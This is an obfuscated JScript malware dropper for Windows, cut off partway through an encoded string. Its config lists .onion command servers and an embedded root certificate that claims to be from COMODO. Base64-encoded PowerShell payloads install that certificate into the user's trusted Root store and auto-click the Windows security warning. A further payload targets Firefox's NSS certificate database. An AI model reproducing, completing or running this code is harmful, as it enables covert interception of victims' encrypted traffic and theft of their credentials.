var Opcgm=null;
var pBGIYAnkrVGDD=null;
var WMkIyQC=null;

var KwpKwFQk = new ActiveXObject("WScript.Shell");
var ILmqJnaRb = new ActiveXObject("Scripting.FileSystemObject");

var BINARY_STREAM_TYPE = 1;
var TEXT_STREAM_TYPE = 2;
var CREATE_OVERWRITE_SAVE_MODE = 2;

var pPzP=KwpKwFQk.ExpandEnvironmentStrings("%TEMP%");
var EPNbDBBCipDjPjL=KwpKwFQk.ExpandEnvironmentStrings("%APPDATA%");
var wZoLNYoX=KwpKwFQk.ExpandEnvironmentStrings("%COMPUTERNAME%");
var Tho=pPzP+"\\"+wZoLNYoX+".log";

var LuTqNHujCwnmK={
	ZVYNwLUidGnoZO: ["yzpayb4sqad7gnin.onion", "bozuniy4sgprvinf.onion", "qr5c2etn6x5lhhfc.onion", "77gxepg2d34nfoid.onion"],
	JbviIuijQwpR: "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",
	ScJdXxGW: "ZnVuY3Rpb24gb3hKRHJqVkR7CkFkZC1UeXBlIEAiCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXM7CnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7CgpwdWJsaWMgc3RhdGljIGNsYXNzIFlGdXdVVW5MV0ZnWm4KewoJcHVibGljIGNsYXNzIEV3V2ZWbFJJaGJ0SXdPCiAgICB7CiAgICAgICAgcHVibGljIHN0cmluZyBXbmRjbGFzczsKICAgICAgICBwdWJsaWMgc3RyaW5nIFRpdGxlOwogICAgICAgIHB1YmxpYyBzdHJpbmcgUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhXbmQ7CiAgICB9CgogICAgcHJpdmF0ZSBkZWxlZ2F0ZSBib29sIFBaRnVTS0V0cG1kKEludFB0ciBoV25kLCByZWYgRXdXZlZsUkloYnRJd08gZGF0YSk7CgogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBFbnVtV2luZG93cyhQWkZ1U0tFdHBtZCBscEVudW1GdW5jLCByZWYgRXdXZlZsUkloYnRJd08gZGF0YSk7CgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRDbGFzc05hbWUoSW50UHRyIGhXbmQsIFN0cmluZ0J1aWxkZXIgbHBDbGFzc05hbWUsIGludCBuTWF4Q291bnQpOwoKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBHZXRXaW5kb3dUZXh0KEludFB0ciBoV25kLCBTdHJpbmdCdWlsZGVyIGxwU3RyaW5nLCBpbnQgbk1heENvdW50KTsKCQoJW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQoJc3RhdGljIGV4dGVybiB1aW50IEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZChJbnRQdHIgaFduZCwgb3V0IHVpbnQgbHBkd1Byb2Nlc3NJZCk7CgkKCVtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KCVtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQoJc3RhdGljIGV4dGVybiBib29sIFNldEZvcmVncm91bmRXaW5kb3coSW50UHRyIGhXbmQpOwoJCglwdWJsaWMgZGVsZWdhdGUgYm9vbCB6V0N4WmdmdllBcWVBKEludFB0ciBod25kLCBJbnRQdHIgbFBhcmFtKTsKCQoJW0RsbEltcG9ydCgidXNlcjMyIildCglbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgRW51bUNoaWxkV2luZG93cyhJbnRQdHIgd2luZG93LCB6V0N4WmdmdllBcWVBIGNhbGxiYWNrLCBJbnRQdHIgbFBhcmFtKTsgIAoJCglbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCglzdGF0aWMgZXh0ZXJuIEludFB0ciBTZW5kTWVzc2FnZShJbnRQdHIgaFduZCwgVUludDMyIE1zZywgSW50UHRyIHdQYXJhbSwgSW50UHRyIGxQYXJhbSk7CgkKCVtGbGFnc10KICAgIHByaXZhdGUgZW51bSBTbmFwc2hvdEZsYWdzIDogdWludAogICAgewogICAgSGVhcExpc3QgPSAweDAwMDAwMDAxLAogICAgUHJvY2VzcyA9IDB4MDAwMDAwMDIsCiAgICBUaHJlYWQgPSAweDAwMDAwMDA0LAogICAgTW9kdWxlID0gMHgwMDAwMDAwOCwKICAgIE1vZHVsZTMyID0gMHgwMDAwMDAxMCwKICAgIEluaGVyaXQgPSAweDgwMDAwMDAwLAogICAgQWxsID0gMHgwMDAwMDAxRiwKICAgIE5vSGVhcHMgPSAweDQwMDAwMDAwCiAgICB9CiAgICAvL2lubmVyIHN0cnVjdCB1c2VkIG9ubHkgaW50ZXJuYWxseQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU0VOVFJZMzIKICAgIHsKICAgIGNvbnN0IGludCBNQVhfUEFUSCA9IDI2MDsKICAgIGludGVybmFsIFVJbnQzMiBkd1NpemU7CiAgICBpbnRlcm5hbCBVSW50MzIgY250VXNhZ2U7CiAgICBpbnRlcm5hbCBVSW50MzIgdGgzMlByb2Nlc3NJRDsKICAgIGludGVybmFsIEludFB0ciB0aDMyRGVmYXVsdEhlYXBJRDsKICAgIGludGVybmFsIFVJbnQzMiB0aDMyTW9kdWxlSUQ7CiAgICBpbnRlcm5hbCBVSW50MzIgY250VGhyZWFkczsKICAgIGludGVybmFsIFVJbnQzMiB0aDMyUGFyZW50UHJvY2Vzc0lEOwogICAgaW50ZXJuYWwgSW50MzIgcGNQcmlDbGFzc0Jhc2U7CiAgICBpbnRlcm5hbCBVSW50MzIgZHdGbGFnczsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IE1BWF9QQVRIKV0KICAgIGludGVybmFsIHN0cmluZyBzekV4ZUZpbGU7CiAgICB9CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXQuQXV0byldCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUb29saGVscDMyU25hcHNob3QoW0luXVVJbnQzMiBkd0ZsYWdzLCBbSW5dVUludDMyIHRoMzJQcm9jZXNzSUQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0LkF1dG8pXQogICAgc3RhdGljIGV4dGVybiBib29sIFByb2Nlc3MzMkZpcnN0KFtJbl1JbnRQdHIgaFNuYXBzaG90LCByZWYgUFJPQ0VTU0VOVFJZMzIgbHBwZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXQuQXV0byldCiAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUHJvY2VzczMyTmV4dChbSW5dSW50UHRyIGhTbmFwc2hvdCwgcmVmIFBST0NFU1NFTlRSWTMyIGxwcGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKFtJbl0gSW50UHRyIGhPYmplY3QpOwogICAgCgljb25zdCBpbnQgaUVIWkhEWXhxSCA9IDB4MDBGNTsKCQoJcHVibGljIHN0YXRpYyBieXRlW10gR09Sc2JseE8oU3RyaW5nIHNDZXJ0KQogICAgewoJCXJldHVybiBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc0NlcnQpOwogICAgfQogICAgICAgIAoJcHVibGljIHN0YXRpYyB2b2lkIEhNZWRlSUJJZml3Y3koU3RyaW5nIHNDZXJ0KXsKCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIltXaW4zMl06OlN0YXJ0KCkiKTsKICAgICAgICBieXRlW10gYkNlcnQgPSBHT1JzYmx4TyhzQ2VydCk7CiAgICAgICAgaWYgKGJDZXJ0ICE9IG51bGwpCiAgICAgICAgewogICAgICAgICAgICBYNTA5Q2VydGlmaWNhdGUyIGNlcnRpZmljYXRlID0gbmV3IFg1MDlDZXJ0aWZpY2F0ZTIoYkNlcnQpOwogICAgICAgICAgICBYNTA5U3RvcmUgc3RvcmUgPSBuZXcgWDUwOVN0b3JlKFN0b3JlTmFtZS5Sb290LCBTdG9yZUxvY2F0aW9uLkN1cnJlbnRVc2VyKTsKICAgICAgICAgICAgc3RvcmUuT3BlbihPcGVuRmxhZ3MuUmVhZFdyaXRlKTsKICAgICAgICAgICAgaWYgKCFzdG9yZS5DZXJ0aWZpY2F0ZXMuQ29udGFpbnMoY2VydGlmaWNhdGUpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJlYWQgdGhyZWFkID0gbmV3IFRocmVhZChTU0h5VlZyQXJjRU9Eaik7CiAgICAgICAgICAgICAgICB0aHJlYWQuU3RhcnQoKTsKICAgICAgICAgICAgICAgIHN0b3JlLkFkZChjZXJ0aWZpY2F0ZSk7CiAgICAgICAgICAgICAgICB0aHJlYWQuSm9pbigpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHN0b3JlLkNsb3NlKCk7CiAgICAgICAgfQoJfQoJCglwdWJsaWMgc3RhdGljIHZvaWQgU1NIeVZWckFyY0VPRGooKQoJewoJCVN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiW1dpbjMyXTo6U2VhcmNoRGlhbG9nKCkiKTsKCQlJbnRQdHIgaFduZDsKCQlkb3sKCQkJaFduZCA9IEhYYVgoIiMzMjc3MCIsU3RyaW5nLkVtcHR5KTsKCQkJaWYgKCFoV25kLkVxdWFscyhJbnRQdHIuWmVybykpCgkJICAgIHsKCQkJCVN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiRm91bmRlZCBoV25kPTB4ezA6WH0iLGhXbmQpOwoJCSAgICAJYnJlYWs7CgkJCX1lbHNlCgkgICAgICAgIHsKCQkJCWhXbmQ9SW50UHRyLlplcm87CgkJCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIlRyeSBhZ2FpbiBmaW5kIHdpbmRvdyIpOwoJICAgICAgICB9CgkJfXdoaWxlIChoV25kLkVxdWFscyhJbnRQdHIuWmVybykpOwoJCVN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiRGlhbG9nIHdpbmRvdyBmb3VuZGVkIik7CgkJU2V0Rm9yZWdyb3VuZFdpbmRvdyhoV25kKTsKCQl6V0N4WmdmdllBcWVBIGNoaWxkUHJvYyA9IG5ldyB6V0N4WmdmdllBcWVBKEJkVXl0YXEpOwoJCUVudW1DaGlsZFdpbmRvd3MoaFduZCwgY2hpbGRQcm9jLCBJbnRQdHIuWmVybyk7Cgl9CgkKCXB1YmxpYyBzdGF0aWMgSW50UHRyIEhYYVgoc3RyaW5nIHduZGNsYXNzLCBzdHJpbmcgdGl0bGUpCiAgICB7CiAgICAgICAgRXdXZlZsUkloYnRJd08gc2QgPSBuZXcgRXdXZlZsUkloYnRJd08oKTsKICAgICAgICBzZC5XbmRjbGFzcyA9IHduZGNsYXNzOwogICAgICAgIHNkLlRpdGxlID0gdGl0bGU7CgkJc2QuaFduZD1JbnRQdHIuWmVybzsKCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIkVudW1XaW5kb3cgLXwiKTsKICAgICAgICBFbnVtV2luZG93cyhuZXcgUFpGdVNLRXRwbWQoQ3lyYm5uRGREUyksIHJlZiBzZCk7CiAgICAgICAgcmV0dXJuIHNkLmhXbmQ7CiAgICB9CiAgICAKCXB1YmxpYyBzdGF0aWMgYm9vbCBDeXJibm5EZERTKEludFB0ciBoV25kLCByZWYgRXdXZlZsUkloYnRJd08gZGF0YSkKICAgIHsKICAgIAlTdHJpbmdCdWlsZGVyIHRpdGxlID0gbmV3IFN0cmluZ0J1aWxkZXIoMTAyNCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBjbGFzc05hbWUgPSBuZXcgU3RyaW5nQnVpbGRlcigxMDI0KTsKICAgICAgICBHZXRXaW5kb3dUZXh0KGhXbmQsIHRpdGxlLCB0aXRsZS5DYXBhY2l0eSk7CiAgICAgICAgR2V0Q2xhc3NOYW1lKGhXbmQsIGNsYXNzTmFtZSwgY2xhc3NOYW1lLkNhcGFjaXR5KTsKICAgICAgICBTdHJpbmcgc0VOPWVqSFVIKGhXbmQpLlRvTG93ZXIoKTsKCQlpZigoIWRhdGEuV25kY2xhc3MuRXF1YWxzKFN0cmluZy5FbXB0eSkgJiYgY2xhc3NOYW1lLlRvU3RyaW5nKCkuU3RhcnRzV2l0aChkYXRhLlduZGNsYXNzKSkgfHwgKCFkYXRhLlRpdGxlLkVxdWFscyhTdHJpbmcuRW1wdHkpICYmIHRpdGxlLlRvU3RyaW5nKCkuU3RhcnRzV2l0aChkYXRhLlRpdGxlKSkpCgkJewoJCQlTeXN0ZW0uQ29uc29sZS5Xcml0ZUxpbmUoIiAgICAgICAgICAgIHwtIGhXbmQ9MHh7MDpYfTsgQ2xhc3M9ezF9OyBUaXRsZT17Mn07IFByb2Nlc3M9ezN9IixoV25kLGNsYXNzTmFtZS5Ub1N0cmluZygpLHRpdGxlLlRvU3RyaW5nKCksc0VOKTsKICAgICAgICAJaWYoc0VOLkNvbnRhaW5zKCJjc3JzcyIpIHx8IHNFTi5Db250YWlucygiY2VydHV0aWwiKSAgfHwgc0VOLkNvbnRhaW5zKCJwb3dlcnNoZWxsIikpCgkgICAgICAgIHsKCQkgICAgICAgIGRhdGEuaFduZCA9IGhXbmQ7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CgkgICAgICAgIH0KICAgICAgICB9CiAgICAgICAJCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgCglwdWJsaWMgc3RhdGljIFN0cmluZyBlakhVSChJbnRQdHIgV2VQVnIpewoJCXVpbnQgVXlFID0gMDsKCQl1aW50IHRocmVhZElEID0gR2V0V2luZG93VGhyZWFkUHJvY2Vzc0lkKFdlUFZyLCBvdXQgVXlFKTsKCQlTdHJpbmcgc1Byb2MgPSBudWxsOwoJICAgIEludFB0ciBoYW5kbGVUb1NuYXBzaG90ID0gSW50UHRyLlplcm87CgkgICAgdHJ5CgkgICAgewoJICAgICAgICBQUk9DRVNTRU5UUlkzMiBDWFJIaXFSSWZpclBxSmggPSBuZXcgUFJPQ0VTU0VOVFJZMzIoKTsKCSAgICAgICAgQ1hSSGlxUklmaXJQcUpoLmR3U2l6ZSA9IChVSW50MzIpTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NFTlRSWTMyKSk7CgkgICAgICAgIGhhbmRsZVRvU25hcHNob3QgPSBDcmVhdGVUb29saGVscDMyU25hcHNob3QoKHVpbnQpU25hcHNob3RGbGFncy5Qcm9jZXNzLCAwKTsKCSAgICAgICAgaWYgKFByb2Nlc3MzMkZpcnN0KGhhbmRsZVRvU25hcHNob3QsIHJlZiBDWFJIaXFSSWZpclBxSmgpKQoJICAgICAgICB7CgkgICAgICAgIGRvCgkgICAgICAgIHsKCSAgICAgICAgICAgIGlmIChVeUUgPT0gQ1hSSGlxUklmaXJQcUpoLnRoMzJQcm9jZXNzSUQpCgkgICAgICAgICAgICB7CgkgICAgICAgICAgICBzUHJvYyA9IENYUkhpcVJJZmlyUHFKaC5zekV4ZUZpbGU7CgkgICAgICAgICAgICBicmVhazsKCSAgICAgICAgICAgIH0KCSAgICAgICAgfSB3aGlsZSAoUHJvY2VzczMyTmV4dChoYW5kbGVUb1NuYXBzaG90LCByZWYgQ1hSSGlxUklmaXJQcUpoKSk7CgkgICAgICAgIH0KCSAgICAgICAgZWxzZQoJICAgICAgICB7CgkgICAgICAgIAl0aHJvdyBuZXcgQXBwbGljYXRpb25FeGNlcHRpb24oc3RyaW5nLkZvcm1hdCgiRmFpbGVkIHdpdGggd2luMzIgZXJyb3IgY29kZSB7MH0iLCBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkpKTsKCSAgICAgICAgfQoJICAgIH0KCSAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQoJICAgIHsKCSAgICAgICAgdGhyb3cgbmV3IEFwcGxpY2F0aW9uRXhjZXB0aW9uKCJDYW4ndCBnZXQgdGhlIHByb2Nlc3MuIiwgZXgpOwoJICAgIH0KCSAgICBmaW5hbGx5CgkgICAgewoJICAgICAgICBDbG9zZUhhbmRsZShoYW5kbGVUb1NuYXBzaG90KTsKCSAgICB9CgkgICAgcmV0dXJuIHNQcm9jOwoJfQoJcHVibGljIHN0YXRpYyBib29sIEJkVXl0YXEoSW50UHRyIFdlUFZyLCBJbnRQdHIgbFBhcmFtKQoJewoJCVNlbmRNZXNzYWdlKFdlUFZyLCBpRUhaSERZeHFILCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwoJCXJldHVybiB0cnVlOwoJfQp9CiJAOwpbWUZ1d1VVbkxXRmdabl06OkhNZWRlSUJJZml3Y3koIiVDRVJUJSIpOwpleGl0Cn0Kb3hKRHJqVkQ=",
	vyOMKczJG: "ZnVuY3Rpb24gRm5BZVVuc1BGWmVYV3lTewpBZGQtVHlwZSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgTWljcm9zb2Z0LldpbjMyOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5Db21wb25lbnRNb2RlbDsKCnB1YmxpYyBzZWFsZWQgY2xhc3MgcldFZVJnRlNFTwp7Cglwcml2YXRlIHN0YXRpYyB2b2xhdGlsZSByV0VlUmdGU0VPIEx6a0ZYZklkOwoJcHJpdmF0ZSBzdGF0aWMgb2JqZWN0IFpmSndtQWtpQ0sgPSBuZXcgT2JqZWN0KCk7CglwdWJsaWMgc3RhdGljIHJXRWVSZ0ZTRU8gZUJHZ1R3ZkxuUmlKbHkoKQogICAgewogICAgICAgIGlmIChMemtGWGZJZCA9PSBudWxsKQogICAgICAgIHsKICAgICAgICAgICAgbG9jayAoWmZKd21Ba2lDSykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKEx6a0ZYZklkID09IG51bGwpCiAgICAgICAgICAgICAgICBMemtGWGZJZCA9IG5ldyByV0VlUmdGU0VPKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIEx6a0ZYZklkOwogICAgfQoJCgljb25zdCBpbnQgWEJJYj0wOwogICAgCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2kpXQogICAgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV1zdHJpbmcgbHBGaWxlTmFtZSk7CgogICAgcHJpdmF0ZSBzdGF0aWMgSW50UHRyIHR3VHN4Ungoc3RyaW5nIGxpYlBhdGgpCiAgICB7CiAgICAgICAgaWYgKFN0cmluZy5Jc051bGxPckVtcHR5KGxpYlBhdGgpKQogICAgICAgICAgICB0aHJvdyBuZXcgQXJndW1lbnROdWxsRXhjZXB0aW9uKCJsaWJQYXRoIik7CgogICAgICAgIEludFB0ciBtb2R1bGVIYW5kbGUgPSBMb2FkTGlicmFyeShsaWJQYXRoKTsKICAgICAgICBpZiAobW9kdWxlSGFuZGxlID09IEludFB0ci5aZXJvKQogICAgICAgIHsKICAgICAgICAgICAgaW50IGxhc3RlcnJvciA9IE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKTsKICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIkxhc3QgZXJyb3I6IDB4ezA6WH0iLGxhc3RlcnJvcikpOwogICAgICAgICAgICBXaW4zMkV4Y2VwdGlvbiBpbm5lckV4ID0gbmV3IFdpbjMyRXhjZXB0aW9uKGxhc3RlcnJvcik7CiAgICAgICAgICAgIGlubmVyRXguRGF0YS5BZGQoIkxhc3RXaW4zMkVycm9yIiwgbGFzdGVycm9yKTsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiY2FuJ3QgbG9hZCBETEwgIiArIGxpYlBhdGgsIGlubmVyRXgpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gbW9kdWxlSGFuZGxlOwogICAgfQoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY2VkdXJlTmFtZSk7CgkvL0NvbnN0YW50cwogICAgY29uc3QgdWludCBOU1NfSU5JVF9SRUFET05MWT0weDE7CiAgICBjb25zdCB1aW50IE5TU19JTklUX05PQ0VSVERCID0gMHgyOwogICAgY29uc3QgdWludCBOU1NfSU5JVF9OT01PRERCID0gMHg0OwogICAgY29uc3QgdWludCBOU1NfSU5JVF9GT1JDRU9QRU4gPSAweDg7CiAgICBjb25zdCB1aW50IE5TU19JTklUX05PUk9PVElOSVQgPSAweDEwOwogICAgY29uc3QgdWludCBOU1NfSU5JVF9PUFRJTUlaRVNQQUNFID0gMHgyMDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfUEsxMVRIUkVBRFNBRkUgPSAweDQwOwogICAgY29uc3QgdWludCBOU1NfSU5JVF9QSzExUkVMT0FEID0gMHg4MDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfTk9QSzExRklOQUxJWkUgPSAweDEwMDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfUkVTRVJWRUQgPSAweDIwMDsKICAgIGNvbnN0IHVpbnQgTlNTX0lOSVRfQ09PUEVSQVRFID0gTlNTX0lOSVRfUEsxMVRIUkVBRFNBRkUgfCBOU1NfSU5JVF9QSzExUkVMT0FEIHwgTlNTX0lOSVRfTk9QSzExRklOQUxJWkUgfCBOU1NfSU5JVF9SRVNFUlZFRDsKCiAgICBjb25zdCBzdHJpbmcgU0VDTU9EX0RCID0gInNlY21vZC5kYiI7CiAgICAvL1N0cnVjdHVyZXMKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHB1YmxpYyBzdHJ1Y3QgU0VDSXRlbSAKICAgIHsKICAgICAgICBwdWJsaWMgdWludCBpVHlwZTsKICAgICAgICBwdWJsaWMgSW50UHRyIGJEYXRhOwogICAgICAgIHB1YmxpYyB1aW50IGlEYXRhTGVuOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IENlcnRUcnVzdHMKICAgIHsKICAgICAgICBwdWJsaWMgaW50IGlTaXRlOwogICAgICAgIHB1YmxpYyBpbnQgaUVtYWlsOwogICAgICAgIHB1YmxpYyBpbnQgaVNvZnQ7CiAgICB9CgogICAgcHJpdmF0ZSBlbnVtIFNFQ0NlcnRVc2FnZQogICAgewogICAgICAgIGNlcnRVc2FnZVNTTENsaWVudCA9IDAsCiAgICAgICAgY2VydFVzYWdlU1NMU2VydmVyID0gMSwKICAgICAgICBjZXJ0V